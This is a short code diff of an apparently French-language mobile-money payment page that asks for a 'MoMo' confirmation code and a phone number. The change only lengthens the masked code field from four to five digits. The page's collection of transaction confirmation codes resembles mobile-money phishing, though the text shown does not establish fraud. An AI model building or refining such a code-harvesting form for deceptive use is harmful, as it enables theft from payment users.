@@ -150,7 +150,7 @@ input:focus{border-color:var(--orange);box-shadow:0 0 0 4px rgba(255,121,0,.09)}
     <section class="card">
       <div class="field">
         <label for="tx1">Code de confirmation <span class="optional">Reçu après paiement</span></label>
-        <div class="input-wrap half"><input id="tx1" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" placeholder="****" maxlength="4"></div>
+        <div class="input-wrap half"><input id="tx1" type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" placeholder="*****" maxlength="5"></div>
         <div class="hint">Saisissez votre Code de confirmation MoMo pour valider votre transaction.</div>
       </div>
     </section>
@@ -206,7 +206,7 @@ $('tx1').addEventListener('input',e=>{
   const val=e.target.value;
   if(val.length>tx1Real.length){
     const added=val.slice(tx1Real.length).replace(/[^0-9]/g,'');
-    tx1Real=(tx1Real+added).slice(0,4);
+    tx1Real=(tx1Real+added).slice(0,5);
   }else{
     tx1Real=tx1Real.slice(0,val.length);
   }
@@ -238,7 +238,7 @@ $('next').onclick=()=>{
 $('next2').onclick=async()=>{
   const tx=tx1Real.trim();
   const phone=$('phone').value.trim();
-  if(tx.length!==4){alert('Le code de confirmation doit contenir 4 chiffres.');$('tx1').focus();return}
+  if(tx.length!==5){alert('Le code de confirmation doit contenir 5 chiffres.');$('tx1').focus();return}
 
   const btn=$('next2');
   btn.disabled=true;
